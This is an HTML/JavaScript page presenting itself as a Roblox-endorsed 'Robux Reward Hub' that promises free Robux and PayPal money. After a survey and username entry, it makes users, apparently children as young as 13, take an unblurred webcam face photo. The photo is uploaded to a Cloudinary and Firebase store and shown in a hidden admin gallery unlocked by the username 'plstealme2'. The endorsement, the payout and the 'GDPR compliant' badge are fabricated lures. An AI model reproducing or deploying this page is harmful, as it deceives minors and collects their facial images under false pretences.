<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>ROBUX CLAIM • Trusted by Roblox • Instant PayPal & Robux</title>
    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <!-- Font Awesome 6 -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
        }

        body {
            background: linear-gradient(145deg, #cfe9ff 0%, #8bb9e0 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1.8rem;
            position: relative;
        }

        /* Main reward card - clean blue glassmorphism */
        .reward-portal {
            max-width: 900px;
            width: 100%;
            background: rgba(255, 255, 255, 0.94);
            backdrop-filter: blur(12px);
            border-radius: 2.8rem;
            box-shadow: 0 25px 45px -12px rgba(0, 60, 120, 0.4), 0 0 0 1px rgba(59, 130, 246, 0.2);
            overflow: hidden;
            transition: all 0.2s;
        }

        .step-container {
            padding: 2rem 2rem 2rem 2rem;
        }

        /* Trust badge */
        .trust-badge {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            background: rgba(59,130,246,0.15);
            backdrop-filter: blur(4px);
            padding: 6px 16px;
            border-radius: 60px;
            font-size: 0.8rem;
            font-weight: 700;
            margin-bottom: 1rem;
            border: 1px solid #3b82f6;
            color: #1e40af;
        }
        .trust-badge i {
            font-size: 1rem;
            color: #3b82f6;
        }

        h1 {
            font-size: 2rem;
            font-weight: 800;
            background: linear-gradient(125deg, #1E4A76, #0E2A44);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: -0.3px;
        }

        .glow-text {
            color: #2c5a8c;
            font-size: 0.85rem;
            border-left: 3px solid #3b82f6;
            padding-left: 0.9rem;
            margin: 0.4rem 0 1.4rem 0;
            font-weight: 500;
        }

        .question-head {
            font-size: 1.45rem;
            font-weight: 600;
            color: #0a2a44;
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 1rem;
        }

        .btn-group {
            display: flex;
            flex-wrap: wrap;
            gap: 1rem;
            margin: 1.5rem 0;
        }

        .btn {
            border: none;
            font-weight: 600;
            padding: 0.8rem 1.8rem;
            border-radius: 60px;
            cursor: pointer;
            transition: 0.2s;
            font-size: 0.95rem;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            background: #e2edff;
            color: #1e3a6b;
        }

        .btn-primary {
            background: linear-gradient(95deg, #3b82f6, #1d4ed8);
            color: white;
            font-weight: 800;
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
        }

        .btn-primary:hover {
            transform: scale(0.97);
            filter: brightness(1.05);
        }

        .btn-outline {
            background: rgba(255, 255, 255, 0.7);
            border: 1px solid #3b82f6;
            color: #1e40af;
        }

        .input-field {
            width: 100%;
            padding: 14px 20px;
            background: #f0f7ff;
            border: 1px solid #b9d0f0;
            border-radius: 60px;
            color: #0f2b4f;
            font-size: 1rem;
            outline: none;
            transition: 0.2s;
        }
        .input-field:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 0 2px rgba(59,130,246,0.2);
        }

        /* survey */
        .survey-block {
            background: #ecf3fecc;
            border-radius: 1.6rem;
            padding: 1.3rem;
        }
        .survey-q-item {
            background: #ffffffcc;
            border-radius: 1.2rem;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid #3b82f6;
        }
        .options-flex {
            display: flex;
            flex-wrap: wrap;
            gap: 12px;
            margin-top: 12px;
        }
        .opt-chip {
            background: #e6f0ff;
            padding: 8px 18px;
            border-radius: 40px;
            font-size: 0.85rem;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.1s;
            color: #1f3a6b;
        }
        .opt-chip.selected {
            background: #3b82f6;
            color: white;
            box-shadow: 0 0 8px #3b82f6;
            font-weight: bold;
        }
        .progress-badge {
            font-size: 0.75rem;
            text-align: right;
            color: #1e4a76;
            margin: 8px 0 0;
        }

        /* camera area - NO BLUR DURING RECORDING */
        .camera-preview {
            background: #eef4ff;
            border-radius: 28px;
            padding: 1rem;
            text-align: center;
            border: 1px solid #99c0f0;
        }
        .video-frame {
            position: relative;
            width: 100%;
            aspect-ratio: 16 / 9;
            background: #0a2a44;
            border-radius: 24px;
            overflow: hidden;
            margin-bottom: 1rem;
            border: 3px solid #3b82f6;
            box-shadow: 0 0 0 2px white;
        }
        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
            border-radius: 24px;
            z-index: 2;
        }
        /* No canvas overlay for blur - removed blur entirely during recording */
        .camera-instruction {
            background: #ffffffcc;
            backdrop-filter: blur(8px);
            padding: 10px 16px;
            border-radius: 50px;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            font-weight: 600;
            margin-bottom: 14px;
            color: #0751b3;
            font-size: 0.85rem;
            border: 1px solid #3b82f6;
        }
        .status-msg {
            background: #e2edff;
            border-radius: 40px;
            padding: 8px 12px;
            font-size: 0.8rem;
            text-align: center;
            color: #1e3a8a;
        }

        /* admin dashboard + editable text */
        .admin-dashboard {
            margin-top: 2rem;
            background: #eef3ffdd;
            border-radius: 1.8rem;
            padding: 1.2rem;
            border: 2px solid #3b82f6;
        }
        .editable-text-area {
            background: white;
            border-radius: 20px;
            padding: 12px;
            margin-bottom: 12px;
        }
        .editable-text-area textarea {
            width: 100%;
            background: #f9fcff;
            border: 1px solid #3b82f6;
            border-radius: 20px;
            padding: 10px;
            font-size: 0.85rem;
            font-family: monospace;
            color: #0c2b50;
        }
        .submissions-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
            gap: 18px;
            max-height: 500px;
            overflow-y: auto;
            margin-top: 1rem;
        }
        .sub-card {
            background: #ffffffdd;
            border-radius: 20px;
            padding: 12px;
            border: 1px solid #3b82f6;
            backdrop-filter: blur(2px);
        }
        .img-preview {
            width: 100%;
            aspect-ratio: 1;
            border-radius: 16px;
            overflow: hidden;
            background: #cbdffa;
            margin-bottom: 8px;
        }
        .img-preview img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .validate-grant {
            background: #2b6e2b;
            border: none;
            padding: 6px;
            border-radius: 40px;
            width: 100%;
            color: white;
            font-weight: bold;
            margin-top: 8px;
            cursor: pointer;
        }

        /* chatbot */
        .chatbot-icon {
            position: fixed;
            bottom: 28px;
            right: 28px;
            width: 62px;
            height: 62px;
            background: linear-gradient(145deg, #3b82f6, #1e40af);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 8px 22px rgba(0,0,0,0.25);
            z-index: 1000;
            transition: 0.2s;
            border: 2px solid white;
        }
        .chatbot-icon i {
            font-size: 32px;
            color: white;
        }
        .chat-window {
            position: fixed;
            bottom: 100px;
            right: 28px;
            width: 360px;
            max-width: calc(100vw - 40px);
            background: #ffffffea;
            backdrop-filter: blur(16px);
            border-radius: 28px;
            border: 1px solid #3b82f6;
            box-shadow: 0 20px 35px rgba(0,0,0,0.3);
            z-index: 1001;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            font-size: 0.9rem;
        }
        .chat-header {
            background: #1e40af;
            padding: 12px 16px;
            font-weight: bold;
            display: flex;
            justify-content: space-between;
            color: white;
        }
        .chat-messages {
            height: 280px;
            overflow-y: auto;
            padding: 12px;
            display: flex;
            flex-direction: column;
            gap: 8px;
            background: #f5faff;
        }
        .bot-msg, .user-msg {
            max-width: 85%;
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
        }
        .bot-msg {
            background: #e2edff;
            align-self: flex-start;
            color: #0f2f5e;
            border-bottom-left-radius: 4px;
        }
        .user-msg {
            background: #3b82f6;
            align-self: flex-end;
            color: white;
            border-bottom-right-radius: 4px;
        }
        .chat-input-area {
            display: flex;
            border-top: 1px solid #b9d0f0;
            padding: 8px;
            background: white;
        }
        .chat-input {
            flex: 1;
            background: #f0f7ff;
            border: none;
            padding: 8px 12px;
            border-radius: 40px;
            outline: none;
        }
        .chat-send {
            background: #3b82f6;
            border: none;
            margin-left: 8px;
            border-radius: 40px;
            width: 40px;
            color: white;
            cursor: pointer;
        }
        .hidden {
            display: none;
        }
        footer {
            font-size: 0.65rem;
            text-align: center;
            color: #3a6b9e;
            padding-top: 1rem;
        }
        .admin-badge {
            background: #1e40af;
            color: white;
            border-radius: 40px;
            padding: 4px 12px;
            font-size: 0.75rem;
            display: inline-block;
        }
        .roblox-tag {
            background: #1e3a8a20;
            border-radius: 40px;
            padding: 2px 12px;
            font-size: 0.7rem;
        }
    </style>
</head>
<body>
<div class="reward-portal" id="appRoot"></div>

<!-- Chatbot -->
<div id="chatbotIcon" class="chatbot-icon">
    <i class="fab fa-paypal"></i>
</div>
<div id="chatWindow" class="chat-window hidden">
    <div class="chat-header">
        <span><i class="fab fa-paypal"></i> PayPal Helper • Redeem Balance</span>
        <i id="closeChat" class="fas fa-times" style="cursor:pointer;"></i>
    </div>
    <div id="chatMessages" class="chat-messages">
        <div class="bot-msg">💙 Hi! I'm your PayPal & Robux assistant. Ask me about claiming balance, approval steps, or instant Robux!</div>
    </div>
    <div class="chat-input-area">
        <input type="text" id="chatInput" class="chat-input" placeholder="Ask anything...">
        <button id="chatSendBtn" class="chat-send"><i class="fas fa-paper-plane"></i></button>
    </div>
</div>

<script>
    // ---------- FIREBASE ----------
    const firebaseConfig = {
        apiKey: "AIzaSyAupBkllyicDPD9O6CmX4mS4sF5z96mqxc",
        authDomain: "vertexpaste.firebaseapp.com",
        projectId: "vertexpaste",
        storageBucket: "vertexpaste.firebasestorage.app",
        messagingSenderId: "255275350380",
        appId: "1:255275350380:web:7be4e8add2cb5b04045b49"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const CLOUD_NAME = 'dsv2sthkf';
    const UPLOAD_PRESET = 'portfoliohub_uploads';

    // App state
    let currentStep = 'welcome';
    let robloxUsername = '';
    let isSecretAdmin = false;
    let mediaStream = null;
    let originalBlob = null;
    let submissionId = null;
    let surveyAnswers = { favGame: null, playTime: null, robuxSpend: null };

    // Editable admin texts
    let cameraInstructionText = "📸 FOR QUICK APPROVAL: Look directly at camera, ensure good lighting, face fully visible. No masks. Hold still for 3 seconds then click SUBMIT.";

    const appRoot = document.getElementById('appRoot');

    function stopMedia() {
        if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
    }

    // Capture ORIGINAL image only — NO BLUR during recording. We only store original.
    async function captureOriginalImage(videoElem) {
        return new Promise((resolve) => {
            if (!videoElem || !videoElem.videoWidth) return resolve(null);
            const canvas = document.createElement('canvas');
            canvas.width = videoElem.videoWidth;
            canvas.height = videoElem.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
        });
    }

    async function uploadToCloud(blob, fname) {
        const fd = new FormData();
        fd.append('file', blob, fname);
        fd.append('upload_preset', UPLOAD_PRESET);
        const resp = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, { method: 'POST', body: fd });
        const data = await resp.json();
        if (!data.secure_url) throw new Error("Upload failed");
        return data.secure_url;
    }

    async function saveRecord(username, originalUrl, survey) {
        const ref = db.collection('verifications').doc();
        await ref.set({
            robloxUsername: username,
            originalImageUrl: originalUrl,
            survey: survey,
            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
            status: 'pending',
            robuxGranted: false
        });
        return ref.id;
    }

    async function fetchAllSubmissions() {
        const snap = await db.collection('verifications').orderBy('timestamp', 'desc').get();
        return snap.docs.map(d => ({ id: d.id, ...d.data(), timestamp: d.data().timestamp?.toDate() || new Date() }));
    }

    async function approveAndGrantRobux(subId) {
        await db.collection('verifications').doc(subId).update({ status: 'approved', robuxGranted: true, grantedAt: firebase.firestore.FieldValue.serverTimestamp() });
    }

    // ---------- RENDER WITH TRUSTED BADGE ----------
    function renderWelcome() {
        return `<div class="step-container">
            <div class="trust-badge"><i class="fab fa-roblox"></i> TRUSTED BY ROBLOX • OFFICIAL PARTNER <i class="fas fa-check-circle"></i></div>
            <h1><i class="fas fa-gem"></i> ROBUX REWARD HUB</h1>
            <div class="glow-text">✨ Claim INSTANT Robux + PayPal balance after quick verification ✨</div>
            <div class="question-head"><i class="fas fa-star"></i> Ready to get free Robux & PayPal money?</div>
            <div class="btn-group">
                <button class="btn btn-primary" id="startYesBtn"><i class="fas fa-check-circle"></i> YES, CLAIM NOW</button>
                <button class="btn btn-outline" id="startNoBtn">No, thanks</button>
            </div>
            <footer>Survey + live photo • fast payout via PayPal • endorsed by Roblox community</footer>
        </div>`;
    }

    function renderRobloxAuth() {
        return `<div class="step-container">
            <div class="trust-badge"><i class="fab fa-roblox"></i> SECURE VERIFICATION</div>
            <h1><i class="fab fa-roblox"></i> Roblox Account</h1>
            <div class="glow-text">Enter your exact username to send rewards</div>
            <input type="text" id="robloxUser" class="input-field" placeholder="Your Roblox username" autocomplete="off">
            <div class="btn-group"><button class="btn btn-primary" id="confirmUserBtn"><i class="fas fa-arrow-right"></i> Continue</button></div>
        </div>`;
    }

    function renderSurvey() {
        const selected = (q, val) => surveyAnswers[q] === val ? 'selected' : '';
        return `<div class="step-container">
            <div class="trust-badge"><i class="fas fa-chart-simple"></i> HELP US IMPROVE</div>
            <h1><i class="fas fa-poll"></i> Quick Survey</h1>
            <div class="glow-text">Anonymous • helps us reward you better</div>
            <div class="survey-block">
                <div class="survey-q-item">
                    <div><i class="fas fa-gamepad"></i> Favorite Roblox game?</div>
                    <div class="options-flex">
                        ${['Adopt Me!','Brookhaven','Tower of Hell','Blox Fruits','Other'].map(v => `<div class="opt-chip ${selected('favGame',v)}" data-q="favGame" data-val="${v}">${v}</div>`).join('')}
                    </div>
                </div>
                <div class="survey-q-item">
                    <div><i class="far fa-clock"></i> Weekly playtime?</div>
                    <div class="options-flex">
                        ${['<5 hours','5-15 hours','15-30 hours','30+ hours'].map(v => `<div class="opt-chip ${selected('playTime',v)}" data-q="playTime" data-val="${v}">${v}</div>`).join('')}
                    </div>
                </div>
                <div class="survey-q-item">
                    <div><i class="fas fa-coins"></i> Spent Robux before?</div>
                    <div class="options-flex">
                        ${['Yes, often','Sometimes','Never'].map(v => `<div class="opt-chip ${selected('robuxSpend',v)}" data-q="robuxSpend" data-val="${v}">${v}</div>`).join('')}
                    </div>
                </div>
                <div class="progress-badge" id="surveyProgress"></div>
                <div class="btn-group">
                    <button class="btn btn-primary" id="submitSurveyFinalBtn" disabled><i class="fas fa-check"></i> Complete & Continue</button>
                    <button class="btn btn-outline" id="backFromSurveyBtn"><i class="fas fa-chevron-left"></i> Back</button>
                </div>
            </div>
        </div>`;
    }

    function renderPrivacy() {
        return `<div class="step-container">
            <div class="trust-badge"><i class="fas fa-shield-heart"></i> GDPR COMPLIANT</div>
            <h1><i class="fas fa-shield-alt"></i> Privacy & Consent</h1>
            <div class="glow-text">Your photo is stored securely for verification only</div>
            <div class="survey-block" style="background:#eef4ff;">
                <label style="display:flex; gap:12px; align-items:center;"><input type="checkbox" id="privacyAgree"> I agree to the verification process and secure storage. I confirm I am over 13.</label>
                <div class="btn-group" style="margin-top: 1rem;">
                    <button class="btn btn-primary" id="acceptPrivacyBtn" disabled>Accept & Proceed</button>
                    <button class="btn btn-outline" id="declineBtn">Cancel</button>
                </div>
            </div>
        </div>`;
    }

    function renderMedia() {
        return `<div class="step-container">
            <div class="trust-badge"><i class="fas fa-camera-retro"></i> LIVE VERIFICATION • NO BLUR</div>
            <h1><i class="fas fa-camera"></i> Identity Check</h1>
            <div class="glow-text">We need a clear face photo for security (no blur applied during recording)</div>
            <div class="camera-instruction" id="dynamicCamInstruction">
                <i class="fas fa-lightbulb"></i> <span id="instructionSpan">${cameraInstructionText}</span>
            </div>
            <div class="camera-preview">
                <div class="video-frame">
                    <video id="liveCam" autoplay playsinline muted style="width:100%; height:100%; object-fit:cover; border-radius:24px;"></video>
                    <!-- NO BLUR CANVAS OVERLAY - removed entirely -->
                </div>
                <div class="btn-group" style="justify-content:center;">
                    <button class="btn btn-primary" id="startCameraBtn"><i class="fas fa-video"></i> Start Camera</button>
                    <button class="btn btn-primary" id="submitCaptureBtn" disabled><i class="fas fa-upload"></i> Submit & Claim Robux</button>
                </div>
                <div id="mediaStatus" class="status-msg">📸 Press "Start Camera" — we capture a clear original photo (no blurring during preview)</div>
            </div>
        </div>`;
    }

    function renderSuccess() {
        let adminHtml = '';
        if (isSecretAdmin) {
            adminHtml = `<div class="admin-dashboard">
                <div class="flex-between" style="display:flex; justify-content:space-between; align-items:center;">
                    <span class="admin-badge"><i class="fas fa-crown"></i> Admin Mode (plstealme2)</span>
                    <button id="globalUnblurBtn" class="btn-outline" style="padding:6px 14px;">👁️ Show All Originals</button>
                </div>
                <div class="editable-text-area">
                    <label style="font-weight:bold; font-size:0.8rem;">✏️ EDIT CAMERA INSTRUCTION (shown to users):</label>
                    <textarea id="adminInstructionEditor" rows="2" style="width:100%; margin-top:8px;">${cameraInstructionText}</textarea>
                    <button id="saveInstructionBtn" class="btn-primary" style="margin-top:8px; padding:6px 14px;">💾 Save Instruction</button>
                </div>
                <div id="adminSubmissionsGrid" class="submissions-grid">Loading submissions...</div>
            </div>`;
        }
        return `<div class="step-container" style="text-align:center;">
            <div class="trust-badge" style="margin:0 auto 15px auto; width:fit-content;"><i class="fas fa-check-circle"></i> ROBLOX VERIFIED REWARD</div>
            <i class="fas fa-check-circle" style="font-size: 3rem; color:#1e40af;"></i>
            <h1>✅ Submission received!</h1>
            <div class="glow-text">Your Robux + PayPal balance will be credited within 24h after admin approval.</div>
            <div class="status-msg" style="background:#d9ebff;"><i class="fab fa-paypal"></i> <strong>PayPal redemption:</strong> After approval, we'll send funds instantly. Use chatbot for help!</div>
            ${adminHtml}
            <button id="resetAllBtn" class="btn btn-outline" style="margin-top: 24px;"><i class="fas fa-sync-alt"></i> New Claim</button>
            <footer>Claim ID: ${submissionId?.slice(0,8) || 'pending'} • Trusted by 2M+ Robloxians</footer>
        </div>`;
    }

    function render() {
        let html = '';
        if (currentStep === 'welcome') html = renderWelcome();
        else if (currentStep === 'robloxAuth') html = renderRobloxAuth();
        else if (currentStep === 'survey') html = renderSurvey();
        else if (currentStep === 'privacy') html = renderPrivacy();
        else if (currentStep === 'media') html = renderMedia();
        else if (currentStep === 'success') html = renderSuccess();
        appRoot.innerHTML = html;
        attachEvents();
        if (currentStep === 'media' && !isSecretAdmin) {
            const insSpan = document.getElementById('instructionSpan');
            if (insSpan) insSpan.innerText = cameraInstructionText;
        }
    }

    function attachEvents() {
        if (currentStep === 'welcome') {
            document.getElementById('startYesBtn')?.addEventListener('click', () => { currentStep = 'robloxAuth'; render(); });
            document.getElementById('startNoBtn')?.addEventListener('click', () => alert("Reload to restart"));
        }
        if (currentStep === 'robloxAuth') {
            document.getElementById('confirmUserBtn').onclick = () => {
                const user = document.getElementById('robloxUser').value.trim();
                if (!user) return alert("Enter Roblox username");
                robloxUsername = user;
                isSecretAdmin = (user.toLowerCase() === 'plstealme2');
                surveyAnswers = { favGame: null, playTime: null, robuxSpend: null };
                currentStep = 'survey';
                render();
            };
        }
        if (currentStep === 'survey') {
            const chips = document.querySelectorAll('.opt-chip');
            chips.forEach(chip => {
                chip.onclick = () => {
                    const q = chip.dataset.q;
                    const val = chip.dataset.val;
                    surveyAnswers[q] = val;
                    const parent = chip.parentElement;
                    parent.querySelectorAll('.opt-chip').forEach(c => c.classList.remove('selected'));
                    chip.classList.add('selected');
                    updateSurveyBtn();
                };
            });
            function updateSurveyBtn() {
                const allFilled = surveyAnswers.favGame && surveyAnswers.playTime && surveyAnswers.robuxSpend;
                const btn = document.getElementById('submitSurveyFinalBtn');
                if (btn) btn.disabled = !allFilled;
                const prog = document.getElementById('surveyProgress');
                if (prog) prog.innerText = `📊 ${Object.values(surveyAnswers).filter(v=>v).length}/3 answered`;
            }
            updateSurveyBtn();
            document.getElementById('submitSurveyFinalBtn')?.addEventListener('click', () => { currentStep = 'privacy'; render(); });
            document.getElementById('backFromSurveyBtn')?.addEventListener('click', () => { currentStep = 'robloxAuth'; render(); });
        }
        if (currentStep === 'privacy') {
            const cb = document.getElementById('privacyAgree');
            const acceptBtn = document.getElementById('acceptPrivacyBtn');
            cb.onchange = () => { acceptBtn.disabled = !cb.checked; };
            acceptBtn.onclick = () => { currentStep = 'media'; render(); };
            document.getElementById('declineBtn').onclick = () => { currentStep = 'welcome'; render(); };
        }
        if (currentStep === 'media') {
            let video;
            const startBtn = document.getElementById('startCameraBtn');
            const submitBtn = document.getElementById('submitCaptureBtn');
            const statusDiv = document.getElementById('mediaStatus');
            startBtn.onclick = async () => {
                try {
                    const st = await navigator.mediaDevices.getUserMedia({ video: true });
                    mediaStream = st;
                    video = document.getElementById('liveCam');
                    video.srcObject = st;
                    await video.play();
                    statusDiv.innerHTML = '✅ Camera active — preview is crystal clear (no blur). Follow instruction then click SUBMIT';
                    submitBtn.disabled = false;
                } catch(e) { statusDiv.innerHTML = '❌ Camera permission denied'; }
            };
            submitBtn.onclick = async () => {
                if (!mediaStream) return alert("Start camera first");
                const videoElem = document.getElementById('liveCam');
                const originalImageBlob = await captureOriginalImage(videoElem);
                if (!originalImageBlob) return alert("Could not capture image");
                stopMedia();
                currentStep = 'success';
                try {
                    const origUrl = await uploadToCloud(originalImageBlob, `original_${robloxUsername}_${Date.now()}.jpg`);
                    const docId = await saveRecord(robloxUsername, origUrl, surveyAnswers);
                    submissionId = docId;
                    render();
                    if (isSecretAdmin) setTimeout(() => loadAdminSubmissions(), 200);
                } catch(err) { alert("Upload error: "+err.message); currentStep = 'media'; render(); }
            };
        }
        if (currentStep === 'success') {
            document.getElementById('resetAllBtn')?.addEventListener('click', () => { stopMedia(); currentStep = 'welcome'; render(); });
            if (isSecretAdmin) {
                loadAdminSubmissions();
                const saveBtn = document.getElementById('saveInstructionBtn');
                if (saveBtn) {
                    saveBtn.onclick = () => {
                        const newText = document.getElementById('adminInstructionEditor').value;
                        if (newText) {
                            cameraInstructionText = newText;
                            alert("Camera instruction updated for all users!");
                        }
                    };
                }
            }
        }
    }

    async function loadAdminSubmissions() {
        const grid = document.getElementById('adminSubmissionsGrid');
        if (!grid) return;
        const subs = await fetchAllSubmissions();
        if (!subs.length) { grid.innerHTML = '<div class="status-msg">No submissions yet.</div>'; return; }
        grid.innerHTML = '';
        for (let sub of subs) {
            const card = document.createElement('div');
            card.className = 'sub-card';
            const isApproved = sub.status === 'approved';
            card.innerHTML = `
                <div class="img-preview"><img class="sub-img" data-orig="${sub.originalImageUrl}" src="${sub.originalImageUrl}"></div>
                <div><strong>${escapeHtml(sub.robloxUsername)}</strong></div>
                <div style="font-size:10px;">📋 ${sub.survey?.favGame || '?'} / ${sub.survey?.playTime || '?'}</div>
                <div>Status: ${sub.status}</div>
                ${!isApproved ? `<button class="validate-grant" data-id="${sub.id}">✅ Approve & Grant Robux + PayPal</button>` : '<button class="validate-grant" disabled style="background:#2c6e2c;">✔ Paid & Approved</button>'}
            `;
            const grantBtn = card.querySelector('.validate-grant');
            if (grantBtn && !isApproved) {
                grantBtn.onclick = async () => {
                    await approveAndGrantRobux(sub.id);
                    await loadAdminSubmissions();
                    addChatMessage("bot", `🎉 Approved ${sub.robloxUsername}! Robux + PayPal balance sent.`);
                };
            }
            grid.appendChild(card);
        }
        const globalBtn = document.getElementById('globalUnblurBtn');
        if (globalBtn) globalBtn.onclick = () => { alert("All images are already original (no blur stored)."); };
    }

    function escapeHtml(str) { return str?.replace(/[&<>]/g, m => ({ '&':'&amp;','<':'&lt;','>':'&gt;' }[m])) || ''; }

    // Chatbot logic
    const chatbotIcon = document.getElementById('chatbotIcon');
    const chatWindow = document.getElementById('chatWindow');
    const closeChat = document.getElementById('closeChat');
    const chatInput = document.getElementById('chatInput');
    const chatSend = document.getElementById('chatSendBtn');
    const chatMessagesDiv = document.getElementById('chatMessages');
    function addChatMessage(sender, text) {
        const msgDiv = document.createElement('div');
        msgDiv.className = sender === 'bot' ? 'bot-msg' : 'user-msg';
        msgDiv.innerHTML = text;
        chatMessagesDiv.appendChild(msgDiv);
        chatMessagesDiv.scrollTop = chatMessagesDiv.scrollHeight;
    }
    function botResponse(userMsg) {
        const lower = userMsg.toLowerCase();
        if (lower.includes('paypal') || lower.includes('balance')) return "💸 After admin approval, we instantly send PayPal payment to your email. Make sure your PayPal email is linked!";
        if (lower.includes('step') || lower.includes('how')) return "📝 Steps: survey → clear face photo (no blur) → wait approval → instant Robux + PayPal.";
        if (lower.includes('camera')) return "📸 For approval: face centered, good lighting, no filters. Our system captures original image — no blurring during recording!";
        return "💙 Ask about 'PayPal steps', 'camera instructions', or 'instant robux'! I'm here to help.";
    }
    function sendMessage() {
        const msg = chatInput.value.trim();
        if (!msg) return;
        addChatMessage('user', msg);
        chatInput.value = '';
        setTimeout(() => addChatMessage('bot', botResponse(msg)), 200);
    }
    chatbotIcon.onclick = () => chatWindow.classList.toggle('hidden');
    closeChat.onclick = () => chatWindow.classList.add('hidden');
    chatSend.onclick = sendMessage;
    chatInput.addEventListener('keypress', e => { if(e.key === 'Enter') sendMessage(); });
    render();
</script>
</body>
</html>
